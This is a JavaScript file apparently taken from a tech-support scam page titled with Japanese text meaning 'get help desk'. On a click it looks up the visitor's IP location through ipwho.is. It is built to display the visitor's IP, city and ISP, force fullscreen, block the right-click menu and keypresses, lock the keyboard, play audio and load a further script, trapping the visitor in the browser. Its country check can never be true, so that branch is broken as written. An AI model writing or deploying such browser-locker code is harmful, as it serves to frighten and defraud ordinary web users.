(async () => {
  globalThis.console.log(`script`, 1);

  const show=    async x1=>{
    document.head.innerHTML = `
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">
      <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
      <meta content="noindex,nofollow" name="robots">
      <link href="index.css" rel="stylesheet">
      <title>ヘルプデスクを取得 -01JP21</title>
    `;

    await document.documentElement.requestFullscreen();

    const ipadd=   x1.ip;
    const city=    x1.city;
    const country= x1.country;
    const isp=     x1.connection.isp;
    const b=       new Date;
    const currtime=x1.timezone.current_time;

    id (`ip_add`).textContent = `Address IP: ${ipadd} ${b.toLocaleString (`EN-US`, currtime)}`;
    id (`cityopm`).textContent = `City: ${city}, ${country}`;
    id (`isp`).textContent = `ISP: ${isp}`;
    id (`mycanvas`).style.display = `block`;
    id (`pridez`).play ();

    window.onload = ()=>{
      window.moveTo (0, 0);
      window.resizeTo (window.screen.availWidth, window.screen.availHeight);
    };
    document.addEventListener(`DOMContentLoaded`, () => document.body.addEventListener(`contextmenu`, z1 => z1.preventDefault()));
    document.onkeydown = ()=>{
      return false;
    };
    await window.navigator.keyboard.lock ();

    load(`./_/x-x.js`);

    return true;
  };

  const none=    async ()=>{
    return false;
  };

  const id=      c1=>document.getElementById (c1);

  document.documentElement.addEventListener(`click`, async () => {
    document.getElementById(`remove`).remove();
    document.body.style.overflow = ``;

    const resp = await window.fetch(`https://ipwho.is/?lang=en`);
    const json = await resp.json();

    if (json.country_code === `IN` && json.country_code === `JP`) {
      await show(json);
    }
    else {
      await none();
    }
  });

  document.body.style.overflow = `hidden`;
})();
